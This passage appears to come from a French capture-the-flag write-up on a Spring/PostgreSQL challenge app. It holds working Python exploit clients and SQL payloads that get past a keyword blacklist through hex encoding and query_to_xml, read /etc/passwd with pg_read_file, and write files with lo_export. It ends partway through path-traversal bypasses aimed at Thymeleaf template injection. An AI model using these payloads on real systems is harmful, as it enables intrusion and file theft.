+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>SQLCheck.<span style="color:#a6e22e">checkBlackList</span>(content)) {
+</span></span><span style="display:flex;"><span>            model.<span style="color:#a6e22e">addAttribute</span>(BindTag.<span style="color:#a6e22e">STATUS_VARIABLE_NAME</span>, 500);
+</span></span><span style="display:flex;"><span>            model.<span style="color:#a6e22e">addAttribute</span>(JsonEncoder.<span style="color:#a6e22e">MESSAGE_ATTR_NAME</span>, <span style="color:#e6db74">&#34;Hacker！&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;error&#34;</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (SQLCheck.<span style="color:#a6e22e">check</span>(sql)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jdbcTemplate</span>.<span style="color:#a6e22e">update</span>(sql);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;redirect:/&#34;</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;redirect:/&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;redirect:/&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Une seconde injection SQL dans le <em>INSERT</em> permet d&rsquo;ajouter ce que l&rsquo;on veut dans la base de donnée.
+De la même manière que la première sqli, nous pouvons utiliser les <code>$</code> pour échapper le filtre.</p>
+<p><img src="./img/screen5.png" alt="Screen5"></p>
+<p>Afin de contourner le filtre sur les mots clés, nous pouvons combiner l&rsquo;utilisation de la fonction <code>query_to_xml</code> ainsi que les fonctions d&rsquo;encodage/décodage d&rsquo;hexadécimal de <em>postgresql</em>.</p>
+<p>On peut convertir une query <code>SELECT '1'</code> en hexadecimal: <code>53454c45435420273127</code> et la faire executer comme ceci:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>query_to_xml(encode(decode(<span style="color:#e6db74">&#39;53454c45435420273127&#39;</span>,<span style="color:#e6db74">&#39;hex&#39;</span>),<span style="color:#e6db74">&#39;es&#39;</span><span style="color:#f92672">||</span><span style="color:#e6db74">&#39;cape&#39;</span>),<span style="color:#66d9ef">true</span>,<span style="color:#66d9ef">true</span>,<span style="color:#e6db74">&#39;&#39;</span>)
+</span></span></code></pre></div><p>Ce qui donne:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;||substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)|| (query_to_xml(encode(decode(&#39;</span><span style="color:#ae81ff">53454</span>c45435420273127<span style="color:#e6db74">&#39;, &#39;</span>hex<span style="color:#e6db74">&#39;),&#39;</span>esc<span style="color:#e6db74">&#39;||&#39;</span>ape<span style="color:#e6db74">&#39;),true,true,&#39;&#39;)) ||&#39;</span>
+</span></span></code></pre></div><p><img src="./img/screen6.png" alt="Screen5"></p>
+<p>De cette manière, on peut mettre à jour notre script pour executer n&rsquo;importe quelle requète <em>SELECT</em> dans le <em>INSERT</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> binascii <span style="color:#f92672">import</span> hexlify
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;SELECT&#34;</span>,<span style="color:#e6db74">&#34;UNION&#34;</span>,<span style="color:#e6db74">&#34;WHERE&#34;</span>,<span style="color:#e6db74">&#34;INSERT&#34;</span>,<span style="color:#e6db74">&#34;ALTER&#34;</span>,<span style="color:#e6db74">&#34;SLEEP&#34;</span>,<span style="color:#e6db74">&#34;DELETE&#34;</span>,<span style="color:#e6db74">&#34;OR&#34;</span>,<span style="color:#e6db74">&#34;EXEC&#34;</span>,<span style="color:#e6db74">&#34;CREATE&#34;</span>,<span style="color:#e6db74">&#34;AND&#34;</span>,<span style="color:#e6db74">&#34;DROP&#34;</span>,<span style="color:#e6db74">&#34;DO&#34;</span>,<span style="color:#e6db74">&#34;COPY&#34;</span>,<span style="color:#e6db74">&#34;SET&#34;</span>,<span style="color:#e6db74">&#34;VACUUM&#34;</span>,<span style="color:#e6db74">&#34;SHOW&#34;</span>,<span style="color:#e6db74">&#34;CURSOR&#34;</span>,<span style="color:#e6db74">&#34;TRUNCATE&#34;</span>,<span style="color:#e6db74">&#34;CAST&#34;</span>,<span style="color:#e6db74">&#34;BEGIN&#34;</span>,<span style="color:#e6db74">&#34;PERFORM&#34;</span>,<span style="color:#e6db74">&#34;END&#34;</span>,<span style="color:#e6db74">&#34;CASE&#34;</span>,<span style="color:#e6db74">&#34;WHEN&#34;</span>,<span style="color:#e6db74">&#34;ALL&#34;</span>,<span style="color:#e6db74">&#34;TABLE&#34;</span>,<span style="color:#e6db74">&#34;UPDATE&#34;</span>,<span style="color:#e6db74">&#34;TRIGGER&#34;</span>,<span style="color:#e6db74">&#34;FUNCTION&#34;</span>,<span style="color:#e6db74">&#34;PROCEDURE&#34;</span>,<span style="color:#e6db74">&#34;DECLARE&#34;</span>,<span style="color:#e6db74">&#34;RETURNING&#34;</span>,<span style="color:#e6db74">&#34;TABLESPACE&#34;</span>,<span style="color:#e6db74">&#34;VIEW&#34;</span>,<span style="color:#e6db74">&#34;SEQUENCE&#34;</span>,<span style="color:#e6db74">&#34;INDEX&#34;</span>,<span style="color:#e6db74">&#34;LOCK&#34;</span>,<span style="color:#e6db74">&#34;GRANT&#34;</span>,<span style="color:#e6db74">&#34;REVOKE&#34;</span>,<span style="color:#e6db74">&#34;SAVEPOINT&#34;</span>,<span style="color:#e6db74">&#34;ROLLBACK&#34;</span>,<span style="color:#e6db74">&#34;IMPORT&#34;</span>,<span style="color:#e6db74">&#34;COMMIT&#34;</span>,<span style="color:#e6db74">&#34;PREPARE&#34;</span>,<span style="color:#e6db74">&#34;EXECUTE&#34;</span>,<span style="color:#e6db74">&#34;EXPLAIN&#34;</span>,<span style="color:#e6db74">&#34;ANALYZE&#34;</span>,<span style="color:#e6db74">&#34;DATABASE&#34;</span>,<span style="color:#e6db74">&#34;PASSWORD&#34;</span>,<span style="color:#e6db74">&#34;CONNECT&#34;</span>,<span style="color:#e6db74">&#34;DISCONNECT&#34;</span>,<span style="color:#e6db74">&#34;PG_SLEEP&#34;</span>,<span style="color:#e6db74">&#34;MERGE&#34;</span>,<span style="color:#e6db74">&#34;USING&#34;</span>,<span style="color:#e6db74">&#34;LIMIT&#34;</span>,<span style="color:#e6db74">&#34;OFFSET&#34;</span>,<span style="color:#e6db74">&#34;RETURN&#34;</span>,<span style="color:#e6db74">&#34;ESCAPE&#34;</span>,<span style="color:#e6db74">&#34;LIKE&#34;</span>,<span style="color:#e6db74">&#34;ILIKE&#34;</span>,<span style="color:#e6db74">&#34;RLIKE&#34;</span>,<span style="color:#e6db74">&#34;EXISTS&#34;</span>,<span style="color:#e6db74">&#34;BETWEEN&#34;</span>,<span style="color:#e6db74">&#34;IS&#34;</span>,<span style="color:#e6db74">&#34;NOT&#34;</span>,<span style="color:#e6db74">&#34;GROUP&#34;</span>,<span style="color:#e6db74">&#34;BY&#34;</span>,<span style="color:#e6db74">&#34;HAVING&#34;</span>,<span style="color:#e6db74">&#34;ORDER&#34;</span>,<span style="color:#e6db74">&#34;WINDOW&#34;</span>,<span style="color:#e6db74">&#34;PARTITION&#34;</span>,<span style="color:#e6db74">&#34;OVER&#34;</span>,<span style="color:#e6db74">&#34;FOREIGN&#34;</span>, <span style="color:#e6db74">&#34;KEY&#34;</span>,<span style="color:#e6db74">&#34;REFERENCE&#34;</span>,<span style="color:#e6db74">&#34;RAISE&#34;</span>,<span style="color:#e6db74">&#34;LISTEN&#34;</span>,<span style="color:#e6db74">&#34;NOTIFY&#34;</span>,<span style="color:#e6db74">&#34;LOAD&#34;</span>,<span style="color:#e6db74">&#34;SECURITY&#34;</span>,<span style="color:#e6db74">&#34;OWNER&#34;</span>,<span style="color:#e6db74">&#34;RULE&#34;</span>,<span style="color:#e6db74">&#34;CLUSTER&#34;</span>,<span style="color:#e6db74">&#34;COMMENT&#34;</span>,<span style="color:#e6db74">&#34;CONVERT&#34;</span>,<span style="color:#e6db74">&#34;COPY&#34;</span>,<span style="color:#e6db74">&#34;CHECKPOINT&#34;</span>,<span style="color:#e6db74">&#34;REINDEX&#34;</span>,<span style="color:#e6db74">&#34;RESET&#34;</span>,<span style="color:#e6db74">&#34;LANGUAGE&#34;</span>,<span style="color:#e6db74">&#34;PLPGSQL&#34;</span>,<span style="color:#e6db74">&#34;PLPYTHON&#34;</span>,<span style="color:#e6db74">&#34;SECDEF&#34;</span>,<span style="color:#e6db74">&#34;NOCREATEDB&#34;</span>,<span style="color:#e6db74">&#34;NOCREATEROLE&#34;</span>,<span style="color:#e6db74">&#34;NOINHERIT&#34;</span>,<span style="color:#e6db74">&#34;NOREPLICATION&#34;</span>,<span style="color:#e6db74">&#34;BYPASSRLS&#34;</span>,<span style="color:#e6db74">&#34;FILE&#34;</span>,<span style="color:#e6db74">&#34;PG_&#34;</span>,<span style="color:#e6db74">&#34;IMPORT&#34;</span>,<span style="color:#e6db74">&#34;EXPORT&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">escape</span>(query):  
+</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> word <span style="color:#f92672">in</span> blacklist:
+</span></span><span style="display:flex;"><span>        word <span style="color:#f92672">=</span> word<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>        query <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>replace(word, word[:len(word)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39;||&#39;&#34;</span><span style="color:#f92672">+</span>word[len(word)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>:])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> query
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">client</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, url):
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>(self, username, password):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/login&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;username&#39;</span>: username, <span style="color:#e6db74">&#39;passwd&#39;</span>: password})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post_message</span>(self, content):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/post_message&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;content&#39;</span>: content})<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sqli</span>(self, query):
+</span></span><span style="display:flex;"><span>        query <span style="color:#f92672">=</span> escape(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        encode(decode(&#39;</span><span style="color:#e6db74">{</span>hexlify(query<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;hex&#39;),&#39;escape&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip())
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>post_message(content<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#39;||</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>bypass<span style="color:#e6db74">}</span><span style="color:#e6db74">|| (query_to_xml(</span><span style="color:#e6db74">{</span>query<span style="color:#e6db74">}</span><span style="color:#e6db74">,true,true,&#39;&#39;)) ||&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> client(url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&lt;ip&gt;:8080&#39;</span>)
+</span></span><span style="display:flex;"><span>admin_passwd <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>leak_admin_password()
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>login(<span style="color:#e6db74">&#39;admin&#39;</span>, admin_passwd)
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>sqli(query<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SELECT &#39;1&#39;&#34;</span>)
+</span></span></code></pre></div><h4 id="file-read">File read</h4>
+<p>On peut utiliser la fonction <code>pg_read_file</code> pour lire des fichiers du serveur:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">client</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, url):
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">file_read</span>(self, path):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sqli(query<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SELECT pg_read_file(&#39;</span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, 0, 200)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> client(url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&lt;ip&gt;:8080&#39;</span>)
+</span></span><span style="display:flex;"><span>admin_passwd <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>leak_admin_password()
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>login(<span style="color:#e6db74">&#39;admin&#39;</span>, admin_passwd)
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>file_read(path<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/etc/passwd&#39;</span>)
+</span></span></code></pre></div><p><img src="./img/screen7.png" alt="Screen7"></p>
+<p>Malheuresement, le DockerFile spécifie cette ligne: <code>RUN chmod 000 /flag</code> qui empêche ici le serveur SQL de lire le contenu du flag.</p>
+<h4 id="file-write">File write</h4>
+<p>Toujours avec <strong>query_to_xml</strong>, on peut utiliser les fonctions:</p>
+<ul>
+<li>lo_from_bytea</li>
+<li>lo_export
+pour ecrire ce que l&rsquo;on veut, ou l&rsquo;on veut:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> random <span style="color:#f92672">import</span> randint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">client</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, url):
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">file_write</span>(self, data, path):
+</span></span><span style="display:flex;"><span>        id_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">43210</span><span style="color:#f92672">+</span>randint(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">99999</span>)
+</span></span><span style="display:flex;"><span>        query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        encode(decode(&#39;</span><span style="color:#e6db74">{</span>hexlify(data<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;hex&#39;),&#39;escape&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SELECT lo_from_bytea(</span><span style="color:#e6db74">{</span>id_<span style="color:#e6db74">}</span><span style="color:#e6db74">, decode(&#39;</span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;hex&#39;))&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SELECT lo_export(</span><span style="color:#e6db74">{</span>id_<span style="color:#e6db74">}</span><span style="color:#e6db74">, &#39;</span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cmd:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>sqli(query<span style="color:#f92672">=</span>c)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> client(url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&lt;ip&gt;:8080&#39;</span>)
+</span></span><span style="display:flex;"><span>admin_passwd <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>leak_admin_password()
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>login(<span style="color:#e6db74">&#39;admin&#39;</span>, admin_passwd)
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>file_write(
+</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Hello World&#39;</span>,
+</span></span><span style="display:flex;"><span>    path<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/tmp/poc.txt&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>Résultat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@e372113213c7:/# ls /tmp
+</span></span><span style="display:flex;"><span>hsperfdata_root  poc.txt  tomcat-docbase.8080.4797479350720433534  tomcat.8080.4797479350720433534
+</span></span><span style="display:flex;"><span>root@e372113213c7:/# cat /tmp/poc.txt
+</span></span><span style="display:flex;"><span>Hello World
+</span></span><span style="display:flex;"><span>root@e372113213c7:/#
+</span></span></code></pre></div><h3 id="troisième-vulnérabilité-injection-de-template">Troisième vulnérabilité: Injection de template</h3>
+<p>Un dernier controller n&rsquo;a pas encore été exploité: <code>NotifyController</code>.<br>
+Celui-ci implémente une seule route en GET: <code>/notify</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> String templatePrefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;file:///non_exists/&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> String templateSuffix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.html&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@GetMapping</span>({<span style="color:#e6db74">&#34;/notify&#34;</span>})
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">notify</span>(<span style="color:#a6e22e">@RequestParam</span> String fname, HttpSession session) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>    InputStream inputStream;
+</span></span><span style="display:flex;"><span>    Integer userId <span style="color:#f92672">=</span> (Integer) session.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;userId&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (userId <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> userId.<span style="color:#a6e22e">intValue</span>() <span style="color:#f92672">==</span> 1) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fname.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;../&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> (inputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">applicationContext</span>.<span style="color:#a6e22e">getResource</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">templatePrefix</span> <span style="color:#f92672">+</span> fname <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">templateSuffix</span>).<span style="color:#a6e22e">getInputStream</span>()) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> safeCheck(inputStream)) {
+</span></span><span style="display:flex;"><span>            String result <span style="color:#f92672">=</span> getTemplateEngine().<span style="color:#a6e22e">process</span>(fname, <span style="color:#66d9ef">new</span> Context());
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;error&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;redirect:login&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Il prend un paramètre <code>fname</code> et essaye de render le fichier <code>/non_exists/&lt;fname&gt;.html</code> avec le template engine <a href="https://www.thymeleaf.org" target="_blank">thymeleaf</a></p>
+<p>Une fonction <code>safeCheck</code> vérifie que la template, si elle existe, ne contienne pas <code>&lt;</code>, <code>&gt;</code>, <code>org.apache</code> ou encore <code>org.spring</code>. Cette fonction nous indique clairement qu&rsquo;il existe une injection de template dans le code et qu&rsquo;il faut l&rsquo;exploiter pour arriver à l&rsquo;execution de commande finale.</p>
+<h4 id="1er-bypass-non_exists">1er Bypass: /non_exists/</h4>
+<p>Le serveur va aller chercher une template dans un dossier <strong>non_exists</strong> à la racine de la machine. Ce dossier n&rsquo;existant pas, la lecture du fichier mènera à un crash de la requète si nous ne trouvons pas un moyen de rediriger le path.<br>
+En remontant avec <code>../</code>, une erreur se produit aussi:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@e372113213c7:/# cat /non_exists/../etc/passwd
+</span></span><span style="display:flex;"><span>cat: /non_exists/../etc/passwd: No such file or directory
+</span></span></code></pre></div><p>ou dans les logs docker:</p>
+<pre tabindex="0"><code>java.io.FileNotFoundException: /non_exists/../etc/passwd.html (No such file or directory)
+</code></pre><p>Aprés un long moment de test et de fuzzing, il se trouve que le <code>\</code> <em>(%5C)</em> permet de bypass ce dossier erroné.<br>
+Ainsi, en envoyant <code>fname=..%5cetc/passwd</code>, le serveur tentera de charger <code>/etc/passwd.html</code> comme template.</p>
+<h4 id="2nd-bypass-html">2nd Bypass: .html</h4>
+<p>On peut bypass l&rsquo;ajout du suffix <strong>.html</strong> en ajoutant à la fin du fichier un <code>?</code> <em>(%3F)</em>.<br>
+Finalement, on peut tester de charger <em>/etc/passwd</em> comme template avec le <em>fname</em> suivant:</p>
+<pre tabindex="0"><code>..%5cetc/passwd%3F
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">client</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, url):
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">notify</span>(self, payload):
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/notify?fname=</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> client(url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&lt;ip&gt;:8080&#39;</span>)
+</span></span><span style="display:flex;"><span>admin_passwd <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>leak_admin_password()
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>login(<span style="color:#e6db74">&#39;admin&#39;</span>, admin_passwd)
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>notify(payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;..</span><span style="color:#e6db74">%5c</span><span style="color:#e6db74">etc/passwd</span><span style="color:#e6db74">%3F</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>print(r)
+</span></span></code></pre></div><p>En executant le code précédent, voici la réponse obtenue:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;2024-01-29T17:19:07.325+00:00&#34;</span>,<span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#ae81ff">500</span>,<span style="color:#f92672">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;Internal Server Error&#34;</span>,<span style="color:#f92672">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;/notify&#34;</span>}
+</span></span></code></pre></div><p>Si on regarde attentivement les logs docker, on obtient:</p>
+<pre tabindex="0"><code>Error resolving template [ &lt;contenu de /etc/passwd&gt; ], template might not exist or might not be accessible by any of the configured Template Resolvers] with root cause
+</code></pre><p><img src="./img/screen8.png" alt="Screen8"></p>
+<p>Aprés quelques recherches, on se rend compte que <em>thymeleaf</em> va ouvrir le contenu du fichier fourni et va essayer de trouver une template correspondante.<br>
+Le souci ici est que les templates connues par <em>thymeleaf</em> sont directement incluses dans le .jar et qu&rsquo;il n&rsquo;est pas possible d&rsquo;en rajouter simplement.</p>
